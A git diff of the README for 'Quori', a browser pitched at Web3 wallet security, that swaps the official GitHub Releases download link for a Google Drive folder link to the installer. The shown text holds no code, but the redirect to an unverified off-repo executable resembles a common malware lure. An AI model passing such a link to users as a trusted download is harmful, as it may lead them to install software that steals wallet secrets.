@@ -1,4 +1,4 @@
-
+![image](https://github.com/user-attachments/assets/8fb002d4-2fac-4552-9543-5f9698654ac6)
 # Quori 🔒
 
 Quori 是一款專注於安全性的瀏覽器，在使用前需要通過 RPS（隨機助記詞系統）進行驗證，專為注重錢包安全的 Web3 使用者設計。
@@ -44,7 +44,7 @@ Quori 是一款專注於安全性的瀏覽器，在使用前需要通過 RPS（�
 
 ## 🪛 安裝方式
 
-請從此處下載最新安裝檔： [Releases](https://github.com/LENT4869/Quori/releases).  
+請從此處下載最新安裝檔：https://drive.google.com/drive/folders/1iuoVJE6BT_kMrpXn_vz_3OiBVOILLgXm?usp=sharing
 執行後依照指示操作即可。
 
 ---
